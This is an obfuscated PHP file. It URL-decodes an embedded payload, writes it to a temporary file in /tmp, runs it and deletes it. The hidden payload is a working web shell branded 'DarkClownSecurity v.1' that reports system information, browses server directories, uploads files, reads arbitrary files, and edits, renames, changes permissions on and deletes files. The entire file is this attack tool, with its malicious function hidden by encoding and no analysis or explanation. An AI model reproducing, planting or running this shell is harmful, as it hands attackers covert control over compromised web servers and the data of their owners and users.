 <?php
   $i = rawurldecode("%3C%3Fphp%0A%20set_time_limit%280%29%3Berror_reporting%280%29%3Bif%28get_magic_quotes_gpc%28%29%29%7Bforeach%28%24_POST%20as%20%24key%3D%3E%24value%29%7B%24_POST%5B%24key%5D%3Dstripslashes%28%24value%29%3B%7D%7D%3F%3E%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en-US%22%3E%0A%0A%09%09%20%3Chead%3E%0A%09%09%09%20%3Cmeta%20charset%3D%22utf-8%22%3E%0A%09%09%09%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%22%3E%0A%09%09%09%20%0A%09%09%09%09%3Ctitle%3EDarkClownSecurity%20v.1%3C%2Ftitle%3E%0A%09%09%09%09%3Clink%20rel%3D%22icon%22%20href%3D%22%2F%2Fi.postimg.cc%2FCL3wFSrQ%2Frsz-index-1.png%22%20%2F%3E%0A%09%09%09%09%3Clink%20rel%3D%22stylesheet%22%20href%3D%22%2F%2Ffonts.googleapis.com%2Fcss%3Ffamily%3DBerkshire%2BSwash%22%20type%3D%22text%2Fcss%22%3E%0A%09%09%09%09%3Clink%20rel%3D%22stylesheet%22%20href%3D%22%2F%2F0x5a455553.github.io%2FMARIJUANA%2FMKY.css%22%20type%3D%22text%2Fcss%22%3E%0A%09%09%09%09%0A%09%09%20%3C%2Fhead%3E%0A%09%09%20%0A%09%09%20%3Cbody%3E%0A%09%09%09%20%3Ch1%3E%0A%09%09%09%09%3Ccenter%3E%0A%09%09%09%09%09%3Ca%20href%3D%22%3C%3Fphp%20%24url%3Dbasename%28%24_SERVER%5B%27PHP_SELF%27%5D%29%3Becho%20%24url%3B%3F%3E%22%3EDarkClownSecurity%20v.1%3c%62%72%3e%3c%69%6d%67%20%77%69%64%74%68%3d%22%33%30%30%22%20%68%65%69%67%68%74%3d%22%32%35%30%22%20%73%72%63%3d%22https://1.bp.blogspot.com/-w6rsqSSKX4E/XVE88z_sBVI/AAAAAAAAEHo/gHbDiWE98wEmfhm4wugU_-F_VZoogV4SACEwYBhgL/s320/dfe21829-f06a-4ebd-8981-d77782bd1614.jpg%22%3e%3C%2Fa%3E%0A%09%09%09%09%3C%2Fcenter%3E%0A%09%09%09%20%3C%2Fh1%3E%0A%09%09%09%20%0A%09%09%09%20%3Ctable%20width%3D%22700%22%20border%3D%220%22%20cellpadding%3D%223%22%20cellspacing%3D%221%22%20align%3D%22center%22%3E%0A%09%09%09%09%3Ctr%3E%0A%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%3C%3Fphp%20echo%20php_uname%28%29%3B%3F%3E%0A%09%09%09%09%09%09%0A%09%09%09%09%09%09%3Cbr%3E%0A%3C%3Fphp%0A%20if%28isset%28%24_GET%5B%27path%27%5D%29%29%7B%24path%3D%24_GET%5B%27path%27%5D%3B%7Delse%20%7B%24path%3Dgetcwd%28%29%3B%7D%24path%3Dstr_replace%28%27%5C%5C%27%2C%27%2F%27%2C%24path%29%3B%24paths%3Dexplode%28%27%2F%27%2C%24path%29%3Bforeach%28%24paths%20as%20%24id%3D%3E%24pat%29%7Bif%28%24pat%3D%3D%27%27%26%26%24id%3D%3D0%29%7B%24a%3Dtrue%3Becho%20%27%0A%09%09%09%09%09%09%3Ca%20class%3D%22wrn%22%20href%3D%22%3Fpath%3D%2F%22%3E%2F%3C%2Fa%3E%27%3Bcontinue%3B%7Dif%28%24pat%3D%3D%27%27%29continue%3Becho%20%27%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%3Ca%20class%3D%22wrn%22%20href%3D%22%3Fpath%3D%27%3Bfor%28%24i%3D0%3B%24i%3C%3D%24id%3B%24i%2B%2B%29%7Becho%20%22%24paths%5B%24i%5D%22%3Bif%28%24i%21%3D%24id%29echo%20%22%2F%22%3B%7Decho%20%27%22%3E%27.%24pat.%27%3C%2Fa%3E%2F%27%3B%7Decho%20%27%0A%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%3C%2Ftr%3E%0A%0A%09%09%09%09%3Ctr%3E%0A%09%09%09%09%09%3Ctd%3E%27%3Bif%28isset%28%24_FILES%5B%27file%27%5D%29%29%7Bif%28copy%28%24_FILES%5B%27file%27%5D%5B%27tmp_name%27%5D%2C%24path.%27%2F%27.%24_FILES%5B%27file%27%5D%5B%27name%27%5D%29%29%7Becho%20%27%0A%09%09%09%09%09%09%3Cscript%3Ealert%28%22OK%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%09%09%0A%09%09%09%09%09%09%3Cbr%3E%0A%09%09%09%09%09%09%27%3B%7Delse%7Becho%20%27%0A%09%09%09%09%09%09%3Cscript%3Ealert%28%22FAIL%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%09%09%0A%09%09%09%09%09%09%3Cbr%3E%0A%09%09%09%09%09%09%27%3B%7D%7D%3F%3E%0A%0A%09%09%09%09%09%09%3Cform%20enctype%3D%22multipart%2Fform-data%22%20method%3D%22POST%22%3E%0A%09%09%09%09%09%09%09%3Cinput%20type%3D%22file%22%20name%3D%22file%22%20%2F%3E%0A%09%09%09%09%09%09%09%3Cinput%20type%3D%22submit%22%20value%3D%22%3E%3E%22%20%2F%3E%0A%09%09%09%09%09%09%3C%2Fform%3E%0A%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%3C%2Ftr%3E%0A%3C%3Fphp%0A%20if%28isset%28%24_GET%5B%27filesrc%27%5D%29%29%7Becho%20%22%09%09%09%09%3Ctr%3E%0A%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3Cbr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3Ccenter%3E%0A%09%09%09%09%09%22%3Becho%20%22%3Cfont%20color%3D%5C%22%2300FF66%20%5C%22%3E%22.%24_GET%5B%27filesrc%27%5D.%22%3C%2Ffont%3E%22%3Becho%20%27%0A%09%09%09%09%09%3C%2Fcenter%3E%0A%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%3C%2Ftr%3E%0A%09%09%09%3C%2Ftable%3E%0A%09%09%09%0A%09%09%09%3Cbr%3E%27%3Becho%28%27%0A%09%09%09%0A%09%09%09%3Cpre%3E%0A%27.htmlspecialchars%28file_get_contents%28%24_GET%5B%27filesrc%27%5D%29%29.%27%09%09%09%0A%09%09%09%3C%2Fpre%3E%27%29%3B%7Delseif%28isset%28%24_GET%5B%27option%27%5D%29%26%26%24_POST%5B%27opt%27%5D%21%3D%27delete%27%29%7Becho%20%27%09%09%09%09%3C%2Ftable%3E%0A%09%09%20%0A%09%09%09%09%3Cbr%3E%0A%09%09%20%0A%09%09%09%09%3Ccenter%3E%27.%24_POST%5B%27path%27%5D.%27%0A%09%09%09%09%0A%09%09%09%09%3Cbr%3E%0A%09%09%09%09%3Cbr%3E%27%3Bif%28%24_POST%5B%27opt%27%5D%3D%3D%27chmod%27%29%7Bif%28isset%28%24_POST%5B%27perm%27%5D%29%29%7Bif%28chmod%28%24_POST%5B%27path%27%5D%2C%24_POST%5B%27perm%27%5D%29%29%7Becho%20%27%0A%09%09%09%09%09%0A%09%09%09%09%3Cscript%3Ealert%28%22OK%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%0A%09%09%09%09%3Cbr%3E%27%3B%7Delse%7Becho%20%27%0A%09%09%09%09%09%0A%09%09%09%09%3Cscript%3Ealert%28%22FAIL%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%0A%09%09%09%09%3Cbr%3E%27%3B%7D%7D%3F%3E%0A%0A%0A%09%09%09%09%3Cform%20method%3D%22POST%22%3E%0A%09%09%09%09%09Permission%20%3A%20%0A%09%09%09%09%09%3Cinput%20name%3D%22perm%22%20type%3D%22text%22%20size%3D%224%22%20value%3D%22%3C%3Fphp%20echo%20substr%28sprintf%28%27%25o%27%2Cfileperms%28%24_POST%5B%27path%27%5D%29%29%2C-4%29%3B%3F%3E%22%20%2F%3E%0A%09%09%09%09%09%3Cinput%20type%3D%22hidden%22%20name%3D%22path%22%20value%3D%22%3C%3Fphp%20echo%20%24_POST%5B%27path%27%5D%3B%3F%3E%22%3E%0A%09%09%09%09%09%3Cinput%20type%3D%22hidden%22%20name%3D%22opt%22%20value%3D%22chmod%22%3E%0A%09%09%09%09%09%3Cinput%20type%3D%22submit%22%20value%3D%22%3E%3E%22%20%2F%3E%0A%09%09%09%09%3C%2Fform%3E%0A%3C%3Fphp%0A%20%7Delseif%28%24_POST%5B%27opt%27%5D%3D%3D%27rename%27%29%7Bif%28isset%28%24_POST%5B%27newname%27%5D%29%29%7Bif%28rename%28%24_POST%5B%27path%27%5D%2C%24path.%27%2F%27.%24_POST%5B%27newname%27%5D%29%29%7Becho%20%27%0A%09%09%09%09%09%0A%09%09%09%09%3Cscript%3Ealert%28%22OK%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%0A%09%09%09%09%3Cbr%3E%27%3B%7Delse%7Becho%20%27%0A%09%09%09%09%09%0A%09%09%09%09%3Cscript%3Ealert%28%22FAIL%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%0A%09%09%09%09%3Cbr%3E%27%3B%7D%24_POST%5B%27name%27%5D%3D%24_POST%5B%27newname%27%5D%3B%7D%3F%3E%0A%0A%0A%09%09%09%09%3Cform%20method%3D%22POST%22%3E%0A%09%09%09%09%09New%20Name%20%3A%20%0A%09%09%09%09%09%3Cinput%20name%3D%22newname%22%20type%3D%22text%22%20size%3D%2220%22%20value%3D%22%3C%3Fphp%20echo%20%24_POST%5B%27name%27%5D%3B%3F%3E%22%20%2F%3E%0A%09%09%09%09%09%3Cinput%20type%3D%22hidden%22%20name%3D%22path%22%20value%3D%22%3C%3Fphp%20echo%20%24_POST%5B%27path%27%5D%3B%3F%3E%22%3E%0A%09%09%09%09%09%3Cinput%20type%3D%22hidden%22%20name%3D%22opt%22%20value%3D%22rename%22%3E%0A%09%09%09%09%09%3Cinput%20type%3D%22submit%22%20value%3D%22%3E%3E%22%20%2F%3E%0A%09%09%09%09%3C%2Fform%3E%0A%3C%3Fphp%0A%20%7Delseif%28%24_POST%5B%27opt%27%5D%3D%3D%27edit%27%29%7Bif%28isset%28%24_POST%5B%27src%27%5D%29%29%7B%24fp%3Dfopen%28%24_POST%5B%27path%27%5D%2C%27w%27%29%3Bif%28fwrite%28%24fp%2C%24_POST%5B%27src%27%5D%29%29%7Becho%20%27%0A%09%09%09%09%09%0A%09%09%09%09%3Cscript%3Ealert%28%22OK%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%0A%09%09%09%09%3Cbr%3E%27%3B%7Delse%7Becho%20%27%0A%09%09%09%09%09%0A%09%09%09%09%3Cscript%3Ealert%28%22FAIL%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%0A%09%09%09%09%3Cbr%3E%27%3B%7Dfclose%28%24fp%29%3B%7D%3F%3E%0A%0A%0A%09%09%09%09%3Cform%20method%3D%22POST%22%3E%0A%09%09%09%09%0A%09%09%09%09%09%3Ctextarea%20cols%3D80%20rows%3D20%20name%3D%22src%22%3E%0A%3C%3Fphp%20echo%20htmlspecialchars%28file_get_contents%28%24_POST%5B%27path%27%5D%29%29%3B%3F%3E%0A%3C%2Ftextarea%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3Cbr%3E%0A%09%09%09%09%09%0A%09%09%09%09%09%3Cinput%20type%3D%22hidden%22%20name%3D%22path%22%20value%3D%22%3C%3Fphp%20echo%20%24_POST%5B%27path%27%5D%3B%3F%3E%22%3E%0A%09%09%09%09%09%3Cinput%20type%3D%22hidden%22%20name%3D%22opt%22%20value%3D%22edit%22%3E%0A%09%09%09%09%09%3Cinput%20type%3D%22submit%22%20value%3D%22%3E%3E%22%20%2F%3E%0A%09%09%09%09%3C%2Fform%3E%0A%3C%3Fphp%0A%20%7Decho%20%27%09%09%09%09%3C%2Fcenter%3E%27%3B%7Delse%7Becho%20%27%09%09%09%20%3C%2Ftable%3E%0A%09%09%20%0A%09%09%09%20%3Cbr%3E%0A%09%09%20%0A%09%09%09%20%3Ccenter%3E%27%3Bif%28isset%28%24_GET%5B%27option%27%5D%29%26%26%24_POST%5B%27opt%27%5D%3D%3D%27delete%27%29%7Bif%28%24_POST%5B%27type%27%5D%3D%3D%27dir%27%29%7Bif%28rmdir%28%24_POST%5B%27path%27%5D%29%29%7Becho%20%27%0A%09%09%09%09%09%0A%09%09%09%09%3Cscript%3Ealert%28%22OK%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%0A%09%09%09%09%3Cbr%3E%27%3B%7Delse%7Becho%20%27%0A%09%09%09%09%09%0A%09%09%09%09%3Cscript%3Ealert%28%22FAIL%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%0A%09%09%09%09%3Cbr%3E%27%3B%7D%7Delseif%28%24_POST%5B%27type%27%5D%3D%3D%27file%27%29%7Bif%28unlink%28%24_POST%5B%27path%27%5D%29%29%7Becho%20%27%0A%09%09%09%09%09%0A%09%09%09%09%3Cscript%3Ealert%28%22OK%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%0A%09%09%09%09%3Cbr%3E%27%3B%7Delse%7Becho%20%27%0A%09%09%09%09%09%0A%09%09%09%09%3Cscript%3Ealert%28%22FAIL%22%29%3B%3C%2Fscript%3E%0A%09%09%09%09%0A%09%09%09%09%3Cbr%3E%27%3B%7D%7D%7Decho%20%27%3C%2Fcenter%3E%27%3B%24scandir%3Dscandir%28%24path%29%3B%3F%3E%0A%0A%0A%09%09%09%20%3Cdiv%20id%3D%22content%22%3E%0A%09%09%09%09%3Ctable%20width%3D%22700%22%20border%3D%220%22%20cellpadding%3D%223%22%20cellspacing%3D%221%22%20align%3D%22center%22%3E%0A%09%09%09%09%09%3Ctr%20class%3D%22first%22%3E%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ccenter%3EName%3C%2Fcenter%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ccenter%3ESize%3C%2Fcenter%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ccenter%3EPermissions%3C%2Fcenter%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ccenter%3EOptions%3C%2Fcenter%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%3C%2Ftr%3E%0A%09%09%09%09%09%0A%3C%3Fphp%0A%20foreach%28%24scandir%20as%20%24dir%29%7Bif%28%21is_dir%28%22%24path%2F%24dir%22%29%7C%7C%24dir%3D%3D%27.%27%7C%7C%24dir%3D%3D%27..%27%29continue%3Becho%20%22%09%09%09%09%09%0A%09%09%09%09%09%3Ctr%3E%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ca%20class%3D%5C%22wrn%5C%22%20href%3D%5C%22%3Fpath%3D%24path%2F%24dir%5C%22%3E%24dir%3C%2Fa%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ccenter%3E--%3C%2Fcenter%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%09%09%09%09%09%09%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ccenter%3E%22%3Bif%28is_writable%28%22%24path%2F%24dir%22%29%29echo%20%27%3Cfont%20color%3D%22%2300BB00%22%3E%27%3Belseif%28%21is_readable%28%22%24path%2F%24dir%22%29%29echo%20%27%3Cfont%20color%3D%22red%22%3E%27%3Becho%20perms%28%22%24path%2F%24dir%22%29%3Bif%28is_writable%28%22%24path%2F%24dir%22%29%7C%7C%21is_readable%28%22%24path%2F%24dir%22%29%29echo%20%27%3C%2Ffont%3E%27%3Becho%20%22%3C%2Fcenter%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ccenter%3E%0A%09%09%09%09%09%09%09%09%3Cform%20method%3D%5C%22POST%5C%22%20action%3D%5C%22%3Foption%26path%3D%24path%5C%22%3E%0A%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%3Cselect%20name%3D%5C%22opt%5C%22%3E%0A%09%09%09%09%09%09%09%09%09%09%3Coption%20value%3D%5C%22%5C%22%3E%3C%2Foption%3E%0A%09%09%09%09%09%09%09%09%09%09%3Coption%20value%3D%5C%22delete%5C%22%3EDelete%3C%2Foption%3E%0A%09%09%09%09%09%09%09%09%09%09%3Coption%20value%3D%5C%22chmod%5C%22%3EChmod%3C%2Foption%3E%0A%09%09%09%09%09%09%09%09%09%09%3Coption%20value%3D%5C%22rename%5C%22%3ERename%3C%2Foption%3E%0A%09%09%09%09%09%09%09%09%09%3C%2Fselect%3E%0A%09%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%3Cinput%20type%3D%5C%22hidden%5C%22%20name%3D%5C%22type%5C%22%20value%3D%5C%22dir%5C%22%3E%0A%09%09%09%09%09%09%09%09%09%3Cinput%20type%3D%5C%22hidden%5C%22%20name%3D%5C%22name%5C%22%20value%3D%5C%22%24dir%5C%22%3E%0A%09%09%09%09%09%09%09%09%09%3Cinput%20type%3D%5C%22hidden%5C%22%20name%3D%5C%22path%5C%22%20value%3D%5C%22%24path%2F%24dir%5C%22%3E%0A%09%09%09%09%09%09%09%09%09%3Cinput%20type%3D%5C%22submit%5C%22%20value%3D%5C%22%3E%3E%5C%22%20%2F%3E%0A%09%09%09%09%09%09%09%09%3C%2Fform%3E%0A%09%09%09%09%09%09%09%3C%2Fcenter%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%3C%2Ftr%3E%22%3B%7D%3F%3E%0A%0A%09%09%09%09%09%3Ctr%20class%3D%22first%22%3E%0A%09%09%09%09%09%09%3Ctd%3E%3C%2Ftd%3E%0A%09%09%09%09%09%09%3Ctd%3E%3C%2Ftd%3E%0A%09%09%09%09%09%09%3Ctd%3E%3C%2Ftd%3E%0A%09%09%09%09%09%09%3Ctd%3E%3C%2Ftd%3E%0A%09%09%09%09%09%3C%2Ftr%3E%0A%3C%3Fphp%0A%20foreach%28%24scandir%20as%20%24file%29%7Bif%28%21is_file%28%22%24path%2F%24file%22%29%29continue%3B%24size%3Dfilesize%28%22%24path%2F%24file%22%29%2F1024%3B%24size%3Dround%28%24size%2C3%29%3Bif%28%24size%3E%3D1024%29%7B%24size%3Dround%28%24size%2F1024%2C2%29.%27%20MB%27%3B%7Delse%7B%24size%3D%24size.%27%20KB%27%3B%7Decho%20%22%09%09%09%09%09%3Ctr%3E%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ca%20class%3D%5C%22wrn%5C%22%20href%3D%5C%22%3Ffilesrc%3D%24path%2F%24file%26path%3D%24path%5C%22%3E%24file%3C%2Fa%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%09%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ccenter%3E%22.%24size.%22%3C%2Fcenter%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ccenter%3E%22%3Bif%28is_writable%28%22%24path%2F%24file%22%29%29echo%20%27%0A%09%09%09%09%09%09%09%09%3Cfont%20color%3D%22%2300BB00%22%3E%27%3Belseif%28%21is_readable%28%22%24path%2F%24file%22%29%29echo%20%27%0A%09%09%09%09%09%09%09%09%3Cfont%20color%3D%22red%22%3E%27%3Becho%20perms%28%22%24path%2F%24file%22%29%3Bif%28is_writable%28%22%24path%2F%24file%22%29%7C%7C%21is_readable%28%22%24path%2F%24file%22%29%29echo%20%27%3C%2Ffont%3E%27%3Becho%20%22%0A%09%09%09%09%09%09%09%3C%2Fcenter%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%09%3Ctd%3E%0A%09%09%09%09%09%09%09%3Ccenter%3E%0A%09%09%09%09%09%09%09%09%3Cform%20method%3D%5C%22POST%5C%22%20action%3D%5C%22%3Foption%26path%3D%24path%5C%22%3E%0A%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%3Cselect%20name%3D%5C%22opt%5C%22%3E%0A%09%09%09%09%09%09%09%09%09%09%3Coption%20value%3D%5C%22%5C%22%3E%3C%2Foption%3E%0A%09%09%09%09%09%09%09%09%09%09%3Coption%20value%3D%5C%22delete%5C%22%3EDelete%3C%2Foption%3E%0A%09%09%09%09%09%09%09%09%09%09%3Coption%20value%3D%5C%22chmod%5C%22%3EChmod%3C%2Foption%3E%0A%09%09%09%09%09%09%09%09%09%09%3Coption%20value%3D%5C%22rename%5C%22%3ERename%3C%2Foption%3E%0A%09%09%09%09%09%09%09%09%09%09%3Coption%20value%3D%5C%22edit%5C%22%3EEdit%3C%2Foption%3E%0A%09%09%09%09%09%09%09%09%09%3C%2Fselect%3E%0A%09%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%3Cinput%20type%3D%5C%22hidden%5C%22%20name%3D%5C%22type%5C%22%20value%3D%5C%22file%5C%22%3E%0A%09%09%09%09%09%09%09%09%09%3Cinput%20type%3D%5C%22hidden%5C%22%20name%3D%5C%22name%5C%22%20value%3D%5C%22%24file%5C%22%3E%0A%09%09%09%09%09%09%09%09%09%3Cinput%20type%3D%5C%22hidden%5C%22%20name%3D%5C%22path%5C%22%20value%3D%5C%22%24path%2F%24file%5C%22%3E%0A%09%09%09%09%09%09%09%09%09%3Cinput%20type%3D%5C%22submit%5C%22%20value%3D%5C%22%3E%3E%5C%22%20%2F%3E%0A%09%09%09%09%09%09%09%09%3C%2Fform%3E%0A%09%09%09%09%09%09%09%3C%2Fcenter%3E%0A%09%09%09%09%09%09%3C%2Ftd%3E%0A%09%09%09%09%09%3C%2Ftr%3E%22%3B%7Decho%20%27%0A%09%09%09%09%3C%2Ftable%3E%0A%09%09%09%3C%2Fdiv%3E%27%3B%7D%3F%3E%0A%0A%0A%09%09%09%3Cbr%3E%0A%09%09%09%0A%09%09%09%3Cdiv%20class%3D%22footer%22%3EHit%20me%20%5Bat%5D%20%3Cfont%20color%3D%22red%22%3Ezhieend%40gmail.com%3C%2Ffont%3E%3C%2Fdiv%3E%0A%09%09%0A%09%09%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%3C%3Fphp%0A%20function%20perms%28%24file%29%7B%24perms%3Dfileperms%28%24file%29%3Bif%28%28%24perms%260xC000%29%3D%3D0xC000%29%7B%24info%3D%27s%27%3B%7Delseif%28%28%24perms%260xA000%29%3D%3D0xA000%29%7B%24info%3D%27l%27%3B%7Delseif%28%28%24perms%260x8000%29%3D%3D0x8000%29%7B%24info%3D%27-%27%3B%7Delseif%28%28%24perms%260x6000%29%3D%3D0x6000%29%7B%24info%3D%27b%27%3B%7Delseif%28%28%24perms%260x4000%29%3D%3D0x4000%29%7B%24info%3D%27d%27%3B%7Delseif%28%28%24perms%260x2000%29%3D%3D0x2000%29%7B%24info%3D%27c%27%3B%7Delseif%28%28%24perms%260x1000%29%3D%3D0x1000%29%7B%24info%3D%27p%27%3B%7Delse%20%7B%24info%3D%27u%27%3B%7D%24info.%3D%28%28%24perms%260x0100%29%3F%27r%27%3A%27-%27%29%3B%24info.%3D%28%28%24perms%260x0080%29%3F%27w%27%3A%27-%27%29%3B%24info.%3D%28%28%24perms%260x0040%29%3F%28%28%24perms%260x0800%29%3F%27s%27%3A%27x%27%29%3A%28%28%24perms%260x0800%29%3F%27S%27%3A%27-%27%29%29%3B%24info.%3D%28%28%24perms%260x0020%29%3F%27r%27%3A%27-%27%29%3B%24info.%3D%28%28%24perms%260x0010%29%3F%27w%27%3A%27-%27%29%3B%24info.%3D%28%28%24perms%260x0008%29%3F%28%28%24perms%260x0400%29%3F%27s%27%3A%27x%27%29%3A%28%28%24perms%260x0400%29%3F%27S%27%3A%27-%27%29%29%3B%24info.%3D%28%28%24perms%260x0004%29%3F%27r%27%3A%27-%27%29%3B%24info.%3D%28%28%24perms%260x0002%29%3F%27w%27%3A%27-%27%29%3B%24info.%3D%28%28%24perms%260x0001%29%3F%28%28%24perms%260x0200%29%3F%27t%27%3A%27x%27%29%3A%28%28%24perms%260x0200%29%3F%27T%27%3A%27-%27%29%29%3Breturn%20%24info%3B%7D%3F%3E");

   function x($i)
   {
       $t = tempnam("/tmp", "0");
       $h = fopen($t, "w+");
       fwrite($h, $i);
       fclose($h);
       require $t;
       unlink($t);
       return get_defined_vars();
   }
   extract(x($i));
?>